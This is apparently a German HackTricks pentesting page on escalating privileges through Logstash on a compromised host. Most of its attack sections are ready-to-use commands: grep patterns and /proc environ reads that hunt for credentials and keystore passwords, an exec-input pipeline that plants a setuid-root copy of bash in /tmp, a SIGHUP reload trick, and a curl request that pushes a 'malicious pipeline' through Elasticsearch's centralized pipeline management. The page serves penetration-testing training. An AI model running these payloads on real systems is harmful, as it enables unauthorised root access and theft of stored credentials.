# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash wird verwendet, um **Logs zu sammeln, zu transformieren und zu versenden** durch ein System, das als **pipelines** bekannt ist. Diese Pipelines setzen sich aus den Stufen **input**, **filter** und **output** zusammen. Ein interessanter Aspekt ergibt sich, wenn Logstash auf einer kompromittierten Maschine läuft.

### Pipeline-Konfiguration

Pipelines werden in der Datei **/etc/logstash/pipelines.yml** konfiguriert, die die Speicherorte der Pipeline-Konfigurationen auflistet:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Diese Datei zeigt, wo die **.conf**-Dateien mit Pipeline-Konfigurationen liegen. Beim Einsatz eines **Elasticsearch output module** ist es üblich, dass **pipelines** **Elasticsearch credentials** enthalten, die oft umfangreiche Rechte besitzen, da Logstash Daten in Elasticsearch schreiben muss. Wildcards in Konfigurationspfaden erlauben Logstash, alle passenden Pipelines im angegebenen Verzeichnis auszuführen.

Wenn Logstash mit `-f <directory>` statt mit `pipelines.yml` gestartet wird, werden **alle Dateien in diesem Verzeichnis in lexikographischer Reihenfolge zusammengefügt und als eine einzige Konfiguration geparst**. Das hat zwei offensive Implikationen:

- Eine abgelegte Datei wie `000-input.conf` oder `zzz-output.conf` kann beeinflussen, wie die finale Pipeline zusammengesetzt wird
- Eine fehlerhafte Datei kann verhindern, dass die gesamte Pipeline geladen wird — validiere daher payloads sorgfältig, bevor du dich auf auto-reload verlässt

### Fast Enumeration on a Compromised Host

Auf einem System, auf dem Logstash installiert ist, überprüfe schnell:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Prüfe außerdem, ob die lokale Monitoring-API erreichbar ist. Standardmäßig bindet sie an **127.0.0.1:9600**, was normalerweise nach dem Zugriff auf den Host ausreicht:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Dies liefert gewöhnlich Pipeline-IDs, Laufzeitdetails und die Bestätigung, dass Ihre modifizierte Pipeline geladen wurde.

Aus Logstash wiederhergestellte Zugangsdaten schalten häufig **Elasticsearch** frei, siehe [this other page about Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

Um Privilegieneskalation zu versuchen, identifizieren Sie zunächst den Benutzer, unter dem der Logstash-Dienst läuft, typischerweise der **logstash**-Benutzer. Stellen Sie sicher, dass Sie **eines** der folgenden Kriterien erfüllen:

- Besitzen **Schreibzugriff** auf eine Pipeline **.conf**-Datei **oder**
- Die **/etc/logstash/pipelines.yml**-Datei verwendet ein Wildcard, und Sie können in den Zielordner schreiben

Zusätzlich muss **eine** der folgenden Bedingungen erfüllt sein:

- Fähigkeit, den Logstash-Dienst neu zu starten **oder**
- In der **/etc/logstash/logstash.yml**-Datei ist **config.reload.automatic: true** gesetzt

Wenn in der Konfiguration ein Wildcard vorhanden ist, ermöglicht das Erstellen einer Datei, die zu diesem Wildcard passt, die Ausführung von Befehlen. Zum Beispiel:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Hier bestimmt **interval** die Ausführungsfrequenz in Sekunden. Im gezeigten Beispiel wird der Befehl **whoami** alle 120 Sekunden ausgeführt, wobei seine Ausgabe nach **/tmp/output.log** geleitet wird.

Mit **config.reload.automatic: true** in **/etc/logstash/logstash.yml** erkennt und übernimmt Logstash automatisch neue oder geänderte Pipeline-Konfigurationen, ohne einen Neustart zu benötigen. Wenn kein Wildcard vorhanden ist, können Änderungen weiterhin an bestehenden Konfigurationen vorgenommen werden, aber Vorsicht ist geboten, um Störungen zu vermeiden.

### Zuverlässigere Pipeline-Payloads

Das `exec` input plugin funktioniert weiterhin in aktuellen Releases und benötigt entweder ein `interval` oder ein `schedule`. Es führt die Ausführung durch **forking** der Logstash JVM aus, daher kann Ihre Payload bei knappem Speicher mit `ENOMEM` fehlschlagen, anstatt stillschweigend zu laufen.

Ein praktischeres privilege-escalation-Payload hinterlässt normalerweise ein dauerhaftes Artefakt:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Wenn du keine Neustart-Rechte hast, aber den Prozess signalisieren kannst, unterstützt Logstash auf Unix-ähnlichen Systemen auch ein durch **SIGHUP** ausgelöstes Neuladen:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Sei dir bewusst, dass nicht jedes Plugin reload-freundlich ist. Zum Beispiel verhindert der **stdin**-Input ein automatisches Neuladen, deswegen solltest du nicht davon ausgehen, dass `config.reload.automatic` deine Änderungen immer übernimmt.

### Geheimnisse aus Logstash stehlen

Bevor du dich nur auf Codeausführung konzentrierst, sammele die Daten, auf die Logstash bereits zugreifen kann:

- Klartext-Anmeldeinformationen sind oft hartkodiert innerhalb von `elasticsearch {}`-Outputs, `http_poller`, JDBC-Inputs oder cloud-bezogenen Einstellungen
- Sichere Einstellungen können in **`/etc/logstash/logstash.keystore`** oder einem anderen `path.settings`-Verzeichnis liegen
- Das Keystore-Passwort wird häufig über **`LOGSTASH_KEYSTORE_PASS`** bereitgestellt, und paketbasierte Installationen beziehen es oft aus **`/etc/sysconfig/logstash`**
- Die Erweiterung von Umgebungsvariablen mit `${VAR}` wird beim Start von Logstash aufgelöst, daher lohnt sich eine Überprüfung der Service-Umgebung

Nützliche Prüfungen:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Das sollte ebenfalls geprüft werden, weil **CVE-2023-46672** gezeigt hat, dass Logstash unter bestimmten Umständen sensitive Informationen in Logs aufzeichnen kann. Auf einem post-exploitation host können daher alte Logstash-Logs und `journald`-Einträge Zugangsdaten offenlegen, selbst wenn die aktuelle Konfiguration den keystore referenziert statt Geheimnisse inline zu speichern.

### Missbrauch des zentralisierten Pipeline-Managements

In manchen Umgebungen verlässt sich der host überhaupt nicht auf lokale `.conf`-Dateien. Wenn **`xpack.management.enabled: true`** konfiguriert ist, kann Logstash zentral verwaltete Pipelines von Elasticsearch/Kibana ziehen, und nach Aktivierung dieses Modus sind lokale Pipeline-Konfigurationen nicht länger die Quelle der Wahrheit.

Das bedeutet einen anderen Angriffsweg:

1. Elastic-Zugangsdaten aus lokalen Logstash-Einstellungen, dem keystore oder Logs wiederherstellen
2. Überprüfen, ob das Konto das Cluster-Privilege **`manage_logstash_pipelines`** besitzt
3. Eine zentral verwaltete Pipeline erstellen oder ersetzen, sodass der Logstash host beim nächsten Poll-Intervall Ihren Payload ausführt

Die für diese Funktion verwendete Elasticsearch API ist:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Das ist besonders nützlich, wenn lokale Dateien nur lesbar sind, aber Logstash bereits registriert ist, um Pipelines aus der Ferne abzurufen.

## Referenzen

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
